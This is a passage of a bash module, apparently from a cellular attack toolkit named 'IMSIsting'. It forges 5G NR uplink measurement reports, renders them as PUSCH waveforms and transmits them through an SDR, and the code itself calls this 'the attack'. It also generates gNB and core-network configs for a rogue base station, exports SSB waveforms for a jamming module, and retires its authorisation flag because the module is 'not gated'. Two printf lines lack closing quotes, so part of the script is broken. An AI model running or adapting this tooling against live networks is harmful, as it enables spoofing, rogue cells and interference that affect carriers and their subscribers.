    # as unknown keys, and rightly so).
    local rspec="" rk
    while IFS= read -r rk; do
        [[ -n "$rk" ]] || continue
        case "${rk%%=*}" in
            arfcn|band|scid) continue ;;
        esac
        rspec+="${rspec:+,}$rk"
    done < <(printf '%s\n' "$spec" | tr ',' '\n')

    local built; built=$(nair_cmd_build_meas_report "$rspec") || return $?
    printf '%s\n' "$built"
    local hex; hex=$(printf '%s\n' "$built" | awk -F'\t' '$1=="submit"{print $2; exit}')
    [[ -n "$hex" ]] || { printf 'ERROR\tthe APER encoder returned no PDU\n' >&2; return 1; }

    local hz; hz=$(nair_arfcn_to_hz "$arfcn") || {
        printf 'ERROR\tNR-ARFCN %s is outside the global raster (TS 38.104 Table 5.4.2.1-1)\n' \
               "$arfcn" >&2; return 2; }

    # The uplink carrier. In TDD the UL shares the carrier with the DL, so the
    # frequency is the one the operator named; the bandwidth and numerology
    # come from the same tables the rest of the module uses.
    local scs=30 bw=20 n_rb nfft fs rb_start=20 n_alloc=20
    n_rb=$(nair_n_rb_for "$scs" "$bw") || {
        printf 'ERROR\tno TS 38.104 N_RB for %s kHz at %s MHz\n' "$scs" "$bw" >&2; return 1; }
    nfft=$(nair_fft_size_for "$scs" "$bw") || {
        printf 'ERROR\tno TS 38.104 N_FFT for %s kHz at %s MHz\n' "$scs" "$bw" >&2; return 1; }
    fs=$(nair_sample_rate_hz "$scs" "$bw") || {
        printf 'ERROR\tno sample rate for %s kHz at %s MHz\n' "$scs" "$bw" >&2; return 1; }
    (( rb_start + n_alloc <= n_rb )) || {
        printf 'ERROR\tallocation RB %s..%s does not fit the %s RB carrier\n' \
               "$rb_start" "$(( rb_start + n_alloc - 1 ))" "$n_rb" >&2; return 1; }

    command -v python3 >/dev/null 2>&1 || {
        printf 'ERROR\tpython3 is required to build the PUSCH waveform\n' >&2; return 1; }
    nair_write_ul_gen || {
        printf 'ERROR\t%s writes the PUSCH generator\n' "$NAIR_UL_PY" >&2; return 1; }

    local base="$NAIR_DIR/nr_meas_report"
    # Not one `local a=X b="$a"` line: bash expands every word before it
    # assigns any of them, so b would be the empty prefix plus ".c16".
    local c16="$base.c16" cs8="$base.cs8"
    local gen
    gen=$(python3 "$NAIR_UL_PY" "$c16" "$hex" "$scid" "$scs" "$nfft" \
                 "$n_rb" "$rb_start" "$n_alloc" --i8 "$cs8" 2>&1) || {
        printf '%s\n' "$gen" >&2
        printf 'ERROR\tthe PUSCH waveform could not be built\n' >&2
        return 1; }
    [[ -s "$c16" ]] || {
        printf 'ERROR\tthe generator wrote no samples to %s\n' "$c16" >&2; return 1; }
    local gv
    gv() { printf '%s\n' "$gen" | awk -F'\t' -v k="$1" '$1==k{print $2; exit}'; }
    printf 'waveform_pusch\t%s\n'        "$c16"
    printf 'waveform_bytes\t%s\n'       "$(wc -c < "$c16" | tr -d ' ')"
    printf 'waveform_samples\t%s\n'     "$(gv slot_samples)"
    printf 'waveform_us\t%s\n'          "$(gv slot_us)"
    printf 'ul_scs_khz\t%s\n'           "$(gv scs_khz)"
    printf 'ul_carrier_rb\t%s\n'        "$n_rb"
    printf 'ul_alloc_rb\t%s..%s\n'      "$rb_start" "$(( rb_start + n_alloc - 1 ))"
    printf 'ul_centre_hz\t%s\n'         "$hz"
    printf 'ul_rate_hz\t%s\n'           "$fs"
    printf 'ul_pci_scrambling_id\t%s\n' "$scid"
    printf 'ul_cp_long\t%s\n'           "$(gv cp_long)"
    printf 'ul_cp_short\t%s\n'          "$(gv cp_short)"
    printf 'ul_dmrs_symbol\t%s\n'       "$(gv dmrs_symbol)"
    printf 'ul_dmrs_c_init\t%s\n'       "$(gv dmrs_c_init)"
    printf 'ul_dmrs_re\t%s\n'           "$(gv dmrs_re)"
    printf 'ul_dmrs_pinned_agree\t%s\n' "$(gv dmrs_pinned_agree)"
    printf 'transform_precoding\t%s\n'  "$(gv transform_precoding)"
    printf 'pusch_encoding\t%s\n'       "$(gv pusch_encoding)"

    # Decode the waveform back before anything is keyed: the PDU must come out
    # of the samples, not out of the encoder's own variables.
    nair_write_ul_dec || {
        printf 'ERROR\t%s writes the PUSCH decoder\n' "$NAIR_UL_DEC_PY" >&2; return 1; }
    local dec drc=0
    dec=$(python3 "$NAIR_UL_DEC_PY" "$c16" "$scs" "$nfft" "$n_rb" "$rb_start" \
                 "$n_alloc" "$scid" --expect "$hex" 2>&1) || drc=$?
    local dv
    dv() { printf '%s\n' "$dec" | awk -F'\t' -v k="$1" '$1==k{print $2; exit}'; }
    if (( drc != 0 )); then
        printf '%s\n' "$dec" >&2
        printf 'ERROR\tthe waveform does not decode as a PUSCH carrying that report (rc %s): nothing was transmitted\n' \
               "$drc" >&2
        return 1
    fi
    printf 'waveform_geometry\t%s\n'      "$(dv geometry_selected)"
    printf 'waveform_cp_symbols_ok\t%s\n' "$(dv cp_symbols_ok)"
    printf 'waveform_cp_symbols_bad\t%s\n' "$(dv cp_symbols_bad)"
    printf 'waveform_dmrs_correlation\t%s\n' "$(dv dmrs_correlation)"
    printf 'waveform_dmrs_pinned_agree\t%s\n' "$(dv dmrs_pinned_agree)"
    printf 'waveform_re_outside_alloc\t%s\n' "$(dv re_outside_alloc)"
    printf 'waveform_pdu_recovered\t%s\n' "$(dv pdu_hex_recovered)"
    printf 'waveform_pdu_match\t%s\n'     "$(dv pdu_match)"

    if [[ -n "${NAIR_TX_DRYRUN:-}" ]]; then
        printf 'tx_device\tnot-probed (NAIR_TX_DRYRUN)\n'
        printf 'transmitted\tno\n'
        printf 'status\twaveform-built\n'
        return 0
    fi

    local dev type
    if dev=$(nair_probe_radio); then
        type=$(printf '%s' "$dev" | cut -f1)
        printf 'tx_driver\t%s\n' "$type"
        printf 'tx_device\t%s\n' "$(printf '%s' "$dev" | cut -f2-)"
    else
        printf 'tx_driver\tnone\n'
        printf 'tx_device\tnone\n'
        if [[ -n "${NAIR_SDR_DEVICE+set}" && -z "${NAIR_SDR_DEVICE}" ]]; then
            printf 'ERROR\tno SDR device: NAIR_SDR_DEVICE is set but empty, which means no radio is configured\n' >&2
        else
            printf 'ERROR\tno SDR device: NAIR_SDR_DEVICE=%s and no radio answered a probe (tried hackrf_info, bladeRF-cli -p, LimeUtil --find, uhd_find_devices)\n' \
                   "${NAIR_SDR_DEVICE:-<unset>}" >&2
        fi
        printf 'WHY\tforging the report is half the attack; radiating it needs a radio\n'
        printf 'transmitted\tno\n'
        printf 'status\tnothing-sent\n'
        return 1
    fi

    nair_tx_run "$type" "$c16" "$fs" "$hz" || {
        printf 'transmitted\tno\n'
        printf 'status\tnothing-sent\n'
        return 1; }
    printf 'tx_armed\t1\n'
    printf 'transmitted\tyes\n'
    printf 'status\ttransmitted\n'
    return 0
}

# ── G5: the same gNB on OpenAirInterface ────────────────────────────────
# srsRAN is not the only gNB this tree can drive: OpenAirInterface's
# nr-softmodem runs the same 5G NR stack on general-purpose x86 with its own
# configuration format, and with --rfsim it runs with no radio at all. What
# differs is the file, the driver and the flags, so this emits the shape OAI
# reads and the command line that goes with it.
nair_oai_gnb() {
    local band="${1:-78}" arfcn="${2:-}" pci="${3:-1}"
    [[ "$band" =~ ^[0-9]+$ ]] || { printf 'ERROR\tband wants a number, e.g. 78\n' >&2; return 2; }
    [[ -z "$arfcn" || "$arfcn" =~ ^[0-9]+$ ]] || { printf 'ERROR\tarfcn wants a number\n' >&2; return 2; }
    [[ "$pci" =~ ^[0-9]+$ ]] || { printf 'ERROR\tpci wants a number\n' >&2; return 2; }
    [[ -n "$arfcn" ]] || arfcn=$(awk -v b="$band" -v tbl="$(nair_band_table)" 'BEGIN{
        cnt = split(tbl, rows, "\n")
        for (i = 1; i <= cnt; i++) {
            split(rows[i], f, "\t")
            if (f[1] == "n" b && f[4] != "") { print f[4]; exit }
        }
    }')
    [[ -n "$arfcn" ]] || { printf 'ERROR\tband %s is not in the band table, so give an --arfcn\n' "$band" >&2; return 2; }
    local mhz; mhz=$(nair_arfcn_to_mhz "$arfcn" 2>/dev/null || printf '?')
    local ssb="$arfcn"
    printf 'driver\t%s\n' "rfsim (no radio) | uhd (USRP) | soapy (LimeSDR, BladeRF) | zmq (explicit loopback)"
    printf 'band\t%s\n' "$band"
    printf 'arfcn\t%s\n' "$arfcn"
    printf 'frequency_mhz\t%s\n' "${mhz%%.*}"
    printf 'pci\t%s\n' "$((pci % 1008))"
    printf 'gnb_conf\t%s\n' "gNB_DU { gNB_ID; gNB_name; tracking_area_code; plmn_list; servingCellConfigCommon { absoluteFrequencySSB, dl_frequencyBand, dl_absoluteFrequencyPointA, ssbSubcarrierSpacing, dl_carrierBandwidth, dl_subcarrierSpacing, pdsch_AntennaPorts, pusch_AntennaPorts, initialCellConfig } }"
    printf 'absolute_freq_ssb\t%s\n' "$ssb"
    printf 'run\t%s\n' "nr-softmodem -O gnb.conf --sa --rfsim --log_config.global_log_options level,nocolour"
    printf 'run_with_radio\t%s\n' "nr-softmodem -O gnb.conf --sa --usrp-args type=b200 --clock-source internal"
    printf 'core\t%s\n' "the AMF the gNB dials is in gnb.conf under amf_ip_address and the PLMN under plmn_list, both read at startup"
    printf 'differences\t%s\n' "srsRAN names its file gnb.conf with a different schema and takes -c; OAI takes -O and its own keys, so a config is not portable between the two"
    printf 'finding\trfsim_needs_no_radio\tINFO\tOAI --rfsim runs the whole stack over a simulated RF path, so a gNB and a UE can be stood up on one laptop with no SDR at all
    printf 'finding\tformat_is_the_portability_cost\tMEDIUM\tporting between srsRAN and OAI is a config rewrite, not a flag change, and the PHY parameters have different names in each\n
    printf 'ref\t%s\n' "OpenAirInterface 5G documentation, gnb.conf reference; srsRAN Project gnb.conf documentation"
    printf 'limit\t%s\n' "this emits the shape and the command line; it does not validate the file against OAI's schema, because OAI's parser is the only thing that does"
    printf 'note\t%s\n' "the config written here is a skeleton to start from: OAI rejects an incomplete gnb.conf loudly, so run it once with --rfsim before pointing it at a radio"
}

nair_find_srsran_gnb() {
    local t
    for t in gnb srsran_gnb srsgnb; do
        command -v "$t" >/dev/null 2>&1 && { echo "$t"; return 0; }
    done
    # srsRAN 4G shipped the gNB under a versioned name in some packages.
    for t in /usr/local/bin/gnb /usr/bin/gnb; do
        [[ -x "$t" ]] && { echo "$t"; return 0; }
    done
    return 1
}

nair_find_open5gs() {
    local t
    for t in open5gs-amfd open5gs-nrfd open5gs-smfd open5gs-upfd open5gs-ausfd open5gs-udmd; do
        command -v "$t" >/dev/null 2>&1 && { echo "$t"; return 0; }
    done
    return 1
}

nair_find_core_tool() {
    local t
    for t in nr-uesoftmodem srsue srsran_ue; do
        command -v "$t" >/dev/null 2>&1 && { echo "$t"; return 0; }
    done
    return 1
}

# ── gNB configuration ───────────────────────────────────────────────────
# A real srsRAN gNB config for the band/ARFCN in play, plus a minimal
# Open5GS-facing AMF block. Every value is derived from the same tables the
# rest of this module uses, so the config cannot drift from the decode.
nair_gen_gnb_conf() {
    local plmn="${1:-00101}" band="${2:-n78}" arfcn="${3:-640000}" pci="${4:-1}" out="${5:-}"
    [[ "$plmn" =~ ^[0-9]{5,6}$ ]] || { printf 'ERROR\tplmn must be 5 or 6 digits\n' >&2; return 2; }
    [[ "$band" =~ ^n[0-9]+$ ]] || { printf 'ERROR\tband must look like n78\n' >&2; return 2; }
    [[ "$arfcn" =~ ^[0-9]+$ ]] || { printf 'ERROR\tarfcn must be numeric\n' >&2; return 2; }
    [[ "$pci" =~ ^[0-9]+$ ]] || { printf 'ERROR\tpci must be numeric\n' >&2; return 2; }
    (( pci <= 1007 )) || { printf 'ERROR\tpci out of range (0..1007)\n' >&2; return 2; }
    local freq; freq=$(nair_arfcn_to_mhz "$arfcn") || {
        printf 'ERROR\tarfcn %s out of range\n' "$arfcn" >&2; return 2; }

    local mcc="${plmn:0:3}" mnc="${plmn:3}"
    local case_ ssb_scs dl_scs
    case_=$(nair_ssb_case_for_band "$band" | awk '{print $2}')
    case "$case_" in
        A) ssb_scs=15 ;;
        B|C) ssb_scs=30 ;;
        D) ssb_scs=120 ;;
        E) ssb_scs=240 ;;
        *) ssb_scs=30 ;;
    esac
    if (( ssb_scs >= 120 )); then dl_scs=120; else dl_scs=30; fi

    [[ -n "$out" ]] || { mkdir -p "$NAIR_DIR"; out="$NAIR_CONF"; }
    mkdir -p "$(dirname "$out")" || { printf 'ERROR\tcannot create %s\n' "$(dirname "$out")" >&2; return 1; }

    if ! cat > "$out" <<EOF
# srsRAN gNB configuration — generated by IMSIsting 12_nr_air.sh
# PLMN ${mcc}-${mnc}  band ${band}  NR-ARFCN ${arfcn}  DL ${freq} MHz  PCI ${pci}
# SSB case ${case_} @ ${ssb_scs} kHz, DL/UL SCS ${dl_scs} kHz
gnb_id: 1
gnb_id_bit_length: 22
ran_node_name: imsisting_gnb
cu_up:
  gtpu:
    bind_addr: 127.0.0.11
amf:
  addr: 127.0.0.5
  bind_addr: 127.0.0.5
  supported_tracking_areas:
    - tac: 7
      plmn_list:
        - plmn: "${mcc}${mnc}"
          tai_slice_support_list:
            - sst: 1
cell_cfg:
  band: ${band}
  dl_arfcn: ${arfcn}
  channel_bandwidth_MHz: 20
  common_scs: ${dl_scs}
  pci: ${pci}
  nof_antennas_dl: 1
  nof_antennas_ul: 1
  prach:
    prach_config_index: 1
    prach_root_sequence_index: 1
    zero_correlation_zone: 0
    prach_frequency_start: 0
  pdsch:
    mcs_table: qam64
  pusch:
    mcs_table: qam64
  pucch:
    resource_set:
      - format: format_1
  ssb:
    ssb_period_ms: 20
    ssb_scs: ${ssb_scs}
    ssb_offset: 2
  tdd_ul_dl_cfg:
    dl_ul_period_slots: 5
    nof_dl_slots: 3
    nof_dl_symbols: 6
    nof_ul_slots: 1
    nof_ul_symbols: 4
log:
  filename: ${NAIR_LOG}
  all_level: info
metrics:
  enable_json: true
  autostart_stdout_metrics: false
EOF
    then
        printf 'ERROR\tcannot write %s\n' "$out" >&2
        return 1
    fi
    printf 'conf\t%s\n'     "$out"
    printf 'plmn\t%s-%s\n'  "$mcc" "$mnc"
    printf 'band\t%s\n'     "$band"
    printf 'dl_arfcn\t%s\n' "$arfcn"
    printf 'dl_mhz\t%s\n'   "$freq"
    printf 'pci\t%s\n'      "$pci"
    printf 'ssb_case\t%s\n' "$case_"
    printf 'ssb_scs_khz\t%s\n' "$ssb_scs"
    printf 'amf\t127.0.0.5\n'
    printf 'status\twritten\n'
}

# A minimal Open5GS AMF/UPF view of the same cell, so a 5GC testbed can be
# pointed at the same PLMN/TAC without hand-editing YAML.
nair_gen_open5gs_conf() {
    local plmn="${1:-00101}" tac="${2:-7}" out="${3:-}"
    [[ "$plmn" =~ ^[0-9]{5,6}$ ]] || { printf 'ERROR\tplmn must be 5 or 6 digits\n' >&2; return 2; }
    [[ "$tac" =~ ^[0-9]+$ ]] || { printf 'ERROR\ttac must be numeric\n' >&2; return 2; }
    local mcc="${plmn:0:3}" mnc="${plmn:3}"
    [[ -n "$out" ]] || { mkdir -p "$NAIR_DIR"; out="$NAIR_DIR/open5gs-amf.yaml"; }
    mkdir -p "$(dirname "$out")" || { printf 'ERROR\tcannot create %s\n' "$(dirname "$out")" >&2; return 1; }
    if ! cat > "$out" <<EOF
# Open5GS AMF slice — generated by IMSIsting 12_nr_air.sh
logger:
  file: ${LOGS_DIR}/open5gs-amf.log
  level: info
amf:
  sbi:
    server:
      - address: 127.0.0.5
        port: 7777
    client:
      nrf:
        - uri: http://127.0.0.10:7777
  ngap:
    server:
      - address: 127.0.0.5
  metrics:
    server:
      - address: 127.0.0.5
        port: 9090
  tai:
    - plmn_id:
        mcc: ${mcc}
        mnc: ${mnc}
      tac: ${tac}
  plmn_support:
    - plmn_id:
        mcc: ${mcc}
        mnc: ${mnc}
      s_nssai:
        - sst: 1
EOF
    then
        printf 'ERROR\tcannot write %s\n' "$out" >&2
        return 1
    fi
    printf 'conf\t%s\n'  "$out"
    printf 'plmn\t%s-%s\n' "$mcc" "$mnc"
    printf 'tac\t%s\n'   "$tac"
    printf 'sbi\t127.0.0.5:7777\n'
    printf 'nrf\t127.0.0.10:7777\n'
    printf 'status\twritten\n'
}

# ── gNB lifecycle ───────────────────────────────────────────────────────
# The pid is written with ${BASHPID:-$$}: under a subshell $$ is the parent
# and --stop would signal the wrong process. --stop is idempotent and exits 0
# when nothing was running.
nair_start() {
    local conf="${1:-$NAIR_CONF}"
    [[ -f "$conf" ]] || { printf 'ERROR\tno gNB config at %s — run --gen-gnb-conf first\n' "$conf" >&2; return 1; }
    local gnb; gnb=$(nair_find_srsran_gnb) || {
        printf 'ERROR\tno srsRAN gNB — install srsRAN Project (gnb) or srsRAN 4G (srsran_gnb)\n' >&2
        return 1
    }
    # A gNB is a transmitter, so it needs a radio before it is worth starting.
    # Without this gate a host that has srsRAN installed and no SDR starts the
    # process, prints `status started`, and radiates nothing — which is the
    # fabricated-success shape this module has to avoid. The device is checked
    # the same way the transmit path checks it, so a driver binary on PATH is
    # still not a radio.
    local txdev txdriver
    if txdev=$(nair_probe_radio); then
        txdriver=$(printf '%s' "$txdev" | cut -f1)
    else
        printf 'ERROR\tno SDR device: the gNB can only run with a radio attached, and none answered a probe (tried hackrf_info, bladeRF-cli -p, LimeUtil --find, uhd_find_devices)\n' >&2
        printf 'WHY\ta gNB process without a radio is not a cell\n' >&2
        return 1
    fi
    mkdir -p "$(dirname "$NAIR_PID")" "$LOGS_DIR"
    if [[ -f "$NAIR_PID" ]]; then
        local old; old=$(cat "$NAIR_PID" 2>/dev/null)
        if [[ -n "$old" ]] && kill -0 "$old" 2>/dev/null; then
            printf 'ERROR\tgNB already running (pid %s)\n' "$old" >&2
            return 1
        fi
        rm -f "$NAIR_PID"
    fi
    ( "$gnb" -c "$conf" >>"$NAIR_LOG" 2>&1 & echo "${BASHPID:-$$}" > "$NAIR_PID"; wait ) &
    sleep 1
    local pid; pid=$(cat "$NAIR_PID" 2>/dev/null)
    [[ -n "$pid" ]] || { printf 'ERROR\t%s did not start; see %s\n' "$gnb" "$NAIR_LOG" >&2; return 1; }
    printf 'pid\t%s\ngnb\t%s\nconf\t%s\nlog\t%s\nsdr\t%s\nstatus\tstarted\n' \
        "$pid" "$gnb" "$conf" "$NAIR_LOG" "$txdriver"
}

nair_stop() {
    local rc=0
    if [[ ! -f "$NAIR_PID" ]]; then
        printf 'status\tnot-running\n'
        return 0
    fi
    local pid; pid=$(cat "$NAIR_PID" 2>/dev/null)
    if [[ -z "$pid" ]]; then
        rm -f "$NAIR_PID"; printf 'status\tnot-running\n'; return 0
    fi
    if kill -0 "$pid" 2>/dev/null; then
        kill "$pid" 2>/dev/null || rc=1
        local i
        for i in 1 2 3 4 5; do
            kill -0 "$pid" 2>/dev/null || break
            sleep 1
        done
        kill -0 "$pid" 2>/dev/null && { kill -9 "$pid" 2>/dev/null; rc=0; }
    fi
    rm -f "$NAIR_PID"
    if (( rc == 0 )); then printf 'status\tstopped\npid\t%s\n' "$pid"
    else printf 'ERROR\tcould not signal pid %s\n' "$pid" >&2; return 1; fi
}

nair_status() {
    local gnb core sdr pid running
    gnb=$(nair_find_srsran_gnb) || gnb="missing"
    core=$(nair_find_open5gs)   || core="missing"
    sdr=$(nair_find_sdr)        || sdr="missing"
    pid=""; running="no"
    if [[ -f "$NAIR_PID" ]]; then
        pid=$(cat "$NAIR_PID" 2>/dev/null)
        [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null && running="yes"
    fi
    printf 'gnb\t%s\n'          "$gnb"
    printf 'nr_core\t%s\n'      "$core"
    printf 'sdr\t%s\n'          "$sdr"
    printf 'gnb_running\t%s\n'  "$running"
    printf 'gnb_pid\t%s\n'      "${pid:-none}"
    printf 'conf\t%s\n'         "$NAIR_CONF"
    printf 'conf_present\t%s\n' "$([[ -f "$NAIR_CONF" ]] && echo yes || echo no)"
    printf 'log\t%s\n'          "$NAIR_LOG"
    printf 'dir\t%s\n'          "$NAIR_DIR"
    # The waveform export is a build capability, not a running state: report
    # whether this module can produce the file the jamming module reads.
    printf 'ssb_waveform\t%s\n' "$(declare -F nair_cmd_ssb_waveform >/dev/null 2>&1 \
        && command -v python3 >/dev/null 2>&1 \
        && echo 'available (--ssb-waveform, cf32|ci16|cu8)' \
        || echo 'missing (needs python3)')"
}

# ── CLI verbs ───────────────────────────────────────────────────────────
nair_cli_status_tsv() { nair_status; }

nair_cmd_arfcn() {
    local n="${1:-}"
    [[ -n "$n" ]] || { printf 'ERROR\tusage: --arfcn <NR-ARFCN>\n' >&2; return 2; }
    [[ "$n" =~ ^[0-9]+$ ]] || { printf 'ERROR\tNR-ARFCN must be numeric: %s\n' "$(nair_sanitize "$n")" >&2; return 2; }
    local rec rc=0
    rec=$(nair_arfcn_record "$n") || rc=1
    if (( rc != 0 )); then
        printf 'ERROR\tNR-ARFCN %s out of range (0..3279165)\n' "$(nair_sanitize "$n")" >&2
        return 1
    fi
    # Command substitution strips the record's trailing newline, so add one
    # back rather than letting the next key land on the same line.
    printf '%s\n' "$rec"
    printf 'gscn\t%s\n' "$(nair_arfcn_gscn_hint "$n")"
}

# Nearest synchronisation raster point at or below the ARFCN, for the FR1
# (N*1.2 MHz + M*0.05 MHz) and FR2 (2400 + N*1.44 MHz) grids. A cell search
# scans GSCN, so this is the number the SDR actually tunes.
nair_arfcn_gscn_hint() {
    local n="${1:-}"
    local f; f=$(nair_arfcn_to_mhz "$n") || { echo "none"; return 0; }
    awk -v f="$f" 'BEGIN{
        if (f < 3000) {
            # GSCN = 3N + (M-3)/2, enumerated directly so the reported GSCN
            # is one this module can convert back with nair_gscn_to_mhz.
            best = -1
            for (N = 1; N <= 2499; N++) {
                for (mi = 0; mi <= 2; mi++) {
                    m = (mi == 0) ? 1 : (mi == 1) ? 3 : 5
                    ss = N * 1.2 + m * 0.05
                    if (ss <= f + 1e-9) {
                        g = 3 * N + int((m - 3) / 2)
                        if (g >= 2) best = g
                    } else break
                }
                if (N * 1.2 > f + 3) break
            }
            print (best < 0) ? "none" : best
        } else if (f < 24250) {
            N = int((f - 3000) / 1.44)
            if (N < 0) N = 0
            print 7499 + N
        } else {
            N = int((f - 24250.08) / 17.28)
            if (N < 0) N = 0
            print 22256 + N
        }
    }'
}

nair_cmd_pci() {
    local a="${1:-}" b="${2:-}"
    [[ -n "$a" && -n "$b" ]] || { printf 'ERROR\tusage: --pci <n_id_1 0..335> <n_id_2 0..2>\n' >&2; return 2; }
    [[ "$a" =~ ^[0-9]+$ && "$b" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tn_id_1 and n_id_2 must be numeric\n' >&2; return 2; }
    (( a <= 335 )) || { printf 'ERROR\tn_id_1 out of range 0..335: %s\n' "$a" >&2; return 2; }
    (( b <= 2 ))   || { printf 'ERROR\tn_id_2 out of range 0..2: %s\n' "$b" >&2; return 2; }
    local pci; pci=$(nair_pci "$a" "$b") || return 1
    printf 'n_id_1\t%s\nn_id_2\t%s\npci\t%s\n' "$a" "$b" "$pci"
    printf 'ssb_case_default\t%s\n' "$(nair_ssb_case_for_band n78)"
    printf 'pss_chips\t127\nsss_chips\t127\npss_root_selected_by\tn_id_2\nsss_selected_by\tn_id_1\n'
}

nair_cmd_decode_mib() {
    local hex="${1:-}"
    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-mib <6 hex digits = 24 bits>\n' >&2; return 2; }
    local out rc=0
    out=$(nair_decode_mib "$hex") || rc=$?
    if (( rc == 3 )); then
        # Well-formed 24-bit payload, but the CHOICE selector says it is not a
        # MIB; nair_decode_mib already named that on stderr.
        printf '%s' "$out"
        return 3
    fi
    if (( rc != 0 )); then
        printf 'ERROR\tMIB payload must be exactly 24 bits (6 hex digits): %s\n' "$(nair_sanitize "$hex")" >&2
        return 1
    fi
    printf '%s' "$out"
}

nair_cmd_decode_sib1() {
    local hex="${1:-}"
    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-sib1 <hex>\n' >&2; return 2; }
    local out rc=0
    out=$(nair_decode_sib1 "$hex") || rc=1
    if (( rc != 0 )); then
        printf 'ERROR\tSIB1 payload too short or not hex (need >= 12 octets): %s\n' "$(nair_sanitize "$hex")" >&2
        return 1
    fi
    printf '%s' "$out"
}

nair_cmd_ssb() {
    local band="${1:-n78}" i="${2:-0}"
    [[ "$band" =~ ^n[0-9]+$ ]] || { printf 'ERROR\tband must look like n78\n' >&2; return 2; }
    [[ "$i" =~ ^[0-9]+$ ]] || { printf 'ERROR\ti_ssb must be numeric\n' >&2; return 2; }
    local case_line case_ scs
    case_line=$(nair_ssb_case_for_band "$band")
    case_=$(awk '{print $2}' <<<"$case_line")
    scs=$(nair_ssb_pattern "$case_" | awk -F'\t' '$1=="scs_khz"{print $2}')
    printf 'band\t%s\n' "$band"
    nair_ssb_pattern "$case_"
    nair_ssb_position "$i" "$case_" || {
        printf 'ERROR\ti_ssb %s not valid for case %s\n' "$(nair_sanitize "$i")" "$case_" >&2; return 1; }
    printf 'scs_khz\t%s\nssb_period_ms\t20\nssb_rb\t20\n' "$scs"
}


# ── SSB waveform export ─────────────────────────────────────────────────
# The receive-side half of this module renders an SSB as bits and grid
# parameters. That is not a waveform: nothing can key a radio with it, and
# nothing can hand it to the jamming module as an IQ file. This verb writes
# ONE SS/PBCH burst (TS 38.211 7.4.3: PSS + SSS + PBCH + PBCH DMRS on 240
# subcarriers of 4 consecutive symbols) with the 5.3.1 cyclic prefixes, mapped
# into an NR channel raster of --n-rb RBs and inverse-FFTed at --rate.
#
# The sequences are NOT re-derived here: the generator's own build_grid() and
# payload/BCH chain produce the 240-long blocks, so a waveform that this
# module's decoder accepts and a waveform the jamming module transmits differ
# only in the mapping and the sample format.
#
# The three formats are modules/33_jamming_detect.sh's build(): cf32 is
# interleaved little-endian float32, ci16 int16 at 32767 (its loader divides
# by 32768), cu8 round(x*127 + 127.5) (its loader subtracts 127.5 and divides
# by 127.5). Same dtype, same scale, same interleave, so ITS loader reads this
# file with no translation.
#
# Stated, because it is not in the clause: --n-rb gives the raster width but
# the SSB's position in that raster needs N_CRB^SSB (offsetToPointA) and k_SSB,
# and this module carries no CORESET#0 / point-A table. Both are taken as 0 —
# the SSB sits on subcarrier 0 of the raster — and printed as
# `ssb_subcarrier_offset`. A receiver told only the raster will not find the
# SSB elsewhere in it.
nair_cmd_ssb_waveform() {
    local out="${1:-}"
    if [[ -z "$out" ]]; then
        printf 'ERROR\tusage: --ssb-waveform <out.iq> [--format cf32|ci16|cu8] [--rate <sps>] [--n-rb <n>] [--pci <n>] [--i-ssb <n>] [--scs <khz>] [--reps <n>]\n' >&2
        return 2
    fi
    shift
    # Defaults are the module's own house cell: pci 1, 30 kHz SSB (Case C),
    # 51 RB = 20 MHz at 30 kHz, 30.72 MHz = 1024 x 30 kHz.
    local fmt=cf32 rate=30720000 nrb=51 pci=1 i_ssb=0 scs=30 reps=1
    while (( $# )); do
        case "$1" in
            --i-have-a-lab-and-authorisation)
                # Retired by the standing policy: this module is not gated, so
                # the old flag is a usage error rather than a no-op.
                printf 'ERROR\t--i-have-a-lab-and-authorisation is retired: module 12 is not gated\n' >&2
                printf 'WHY\tthe flag only ever carried a disclaimer; this verb writes a file and keys nothing\n' >&2
                return 2 ;;
            --format|--rate|--n-rb|--pci|--i-ssb|--scs|--reps)
                if (( $# < 2 )); then
                    printf 'ERROR\t%s needs a value\n' "$1" >&2; return 2
                fi
                local opt="$1" val="$2"
                shift 2
                case "$opt" in
                    --format) fmt="$val" ;;
                    --rate)   rate="$val" ;;
                    --n-rb)   nrb="$val" ;;
                    --pci)    pci="$val" ;;
                    --i-ssb)  i_ssb="$val" ;;
                    --scs)    scs="$val" ;;
                    --reps)   reps="$val" ;;
                esac ;;
            *)
                printf 'ERROR\tunknown option for --ssb-waveform: %s\n' "$(nair_sanitize "$1")" >&2
                printf 'WHY\tthe verb takes --format, --rate, --n-rb, --pci, --i-ssb, --scs and --reps\n' >&2
                return 2 ;;
        esac
    done

    # Sample format aliases, the same ones module 33 accepts from drivers, so a
    # caller can pass `cs8`/`c16` and get the format it asked for.
    case "$fmt" in
        cf32) ;;
        ci16|cs16|sc16|c16) fmt=ci16 ;;
        cu8|cs8|csv)        fmt=cu8 ;;
        *) printf 'ERROR\tformat must be cf32|ci16|cu8 (or a driver alias: cs8|c16|sc16|cs16|csv)\n' >&2
           printf 'WHY\tthose are the three layouts modules/33_jamming_detect.sh load_iq() reads\n' >&2
           return 2 ;;
    esac

    [[ "$pci"   =~ ^[0-9]+$ ]] || { printf 'ERROR\tpci must be numeric\n' >&2; return 2; }
    if (( pci > 1007 )); then
        printf 'ERROR\tpci %s is out of range\n' "$pci" >&2
        printf 'WHY\tNR PCI is 3*N_ID(1) + N_ID(2) with N_ID(1) 0..335: 0..1007\n' >&2
        return 2
    fi
    [[ "$i_ssb" =~ ^[0-9]+$ ]] || { printf 'ERROR\ti_ssb must be numeric\n' >&2; return 2; }
    [[ "$nrb"   =~ ^[0-9]+$ ]] || { printf 'ERROR\t--n-rb must be numeric\n' >&2; return 2; }
    [[ "$reps"  =~ ^[0-9]+$ ]] || { printf 'ERROR\t--reps must be numeric\n' >&2; return 2; }
    [[ "$rate"  =~ ^[0-9]+$ ]] || { printf 'ERROR\t--rate must be numeric samples/second\n' >&2; return 2; }
    if (( reps < 1 )); then
        printf 'ERROR\t--reps must be >= 1\n' >&2
        printf 'WHY\tone burst is the shortest waveform; --reps 0 would write no samples, which the consumer rejects\n' >&2
        return 2
    fi
    if (( rate < 1 )); then
        printf 'ERROR\t--rate must be > 0\n' >&2
        printf 'WHY\tthe sample rate fixes N_FFT = rate / SCS and the file length\n' >&2
        return 2
    fi
    if (( nrb < 20 )); then
        printf 'ERROR\t--n-rb %s cannot hold the SS/PBCH block\n' "$nrb" >&2
